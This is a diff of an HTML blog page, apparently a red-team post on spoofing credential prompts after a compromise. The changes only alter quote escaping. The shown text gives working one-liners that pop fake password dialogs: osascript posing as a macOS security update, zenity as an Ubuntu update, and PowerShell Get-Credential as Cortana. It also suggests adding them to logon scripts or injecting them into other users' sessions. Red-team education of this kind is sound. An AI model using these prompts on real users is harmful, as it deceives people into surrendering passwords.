@@ -139,7 +139,7 @@
 <p><code># osascript -e 'display notification &quot;Hello World!&quot;'</code></p>
 <p>Neat.</p>
 <p>It also allows to create a password prompt&hellip; There is the display dialog feature with a hidden answer option to create a password prompt.</p>
-<pre tabindex="0"><code># PWD_SPOOF=$(osascript -e 'display dialog &quot;To perform a security update MacOS needs your password.&quot; with title &quot;MacOS Security Update&quot; default answer &quot;&quot; with icon stop with hidden answer')
+<pre tabindex="0"><code># PWD_SPOOF=$(osascript -e &#39;display dialog &#34;To perform a security update MacOS needs your password.&#34; with title &#34;MacOS Security Update&#34; default answer &#34;&#34; with icon stop with hidden answer&#39;)
 # echo $PWD_SPOOF
 button returned:OK, text returned:S3cr3tPa$$w0rd!
 </code></pre><p>That’s pretty much all that is needed for a post exploit technique.</p>
@@ -148,12 +148,12 @@ button returned:OK, text returned:S3cr3tPa$$w0rd!
 <h3 id="linux-spoofing-a-credential-prompt-via-zenity">Linux: Spoofing a credential prompt via zenity</h3>
 <p>Typically, you won’t encounter that many Linux desktop users during red teaming operations.</p>
 <p>But if, then <code>zenity</code> is useful and it even has a <code>–password</code> option that can be used.</p>
-<pre tabindex="0"><code>wuzzi@saturn:$ PWD=$(zenity --password --text &quot;Ubuntu Update needs your password: &quot; --title &quot;Ubuntu System Update&quot;) 2&gt;/dev/null
+<pre tabindex="0"><code>wuzzi@saturn:$ PWD=$(zenity --password --text &#34;Ubuntu Update needs your password: &#34; --title &#34;Ubuntu System Update&#34;) 2&gt;/dev/null
 </code></pre><p><img src="/blog/images/2021/linux-spoof-fs.png" alt="Linux spoof"></p>
 <p>That&rsquo;s a way I was able to emulate this attack on Linux.</p>
 <h3 id="windows-spoofing-a-credential-prompt-with-powershell">Windows: Spoofing a credential prompt with PowerShell</h3>
 <p>On Windows <code>Get-Credential</code> is your friendly PowerShell command to do this.</p>
-<pre tabindex="0"><code>$creds = Get-Credential -UserName $env:USERNAME -Message &quot;Cortana wants setup a reminder and needs your permission&quot;
+<pre tabindex="0"><code>$creds = Get-Credential -UserName $env:USERNAME -Message &#34;Cortana wants setup a reminder and needs your permission&#34;
 </code></pre><p>This results in a pop with the following look and feel:</p>
 <p><img src="/blog/images/2021/windows-spoof.png" alt="Windows spoof"></p>
 <p>A simple line like this can be added to a user’s logon script, AutoStart, or it can be actively injected in another user’s session on the machine during post-exploitation.</p>
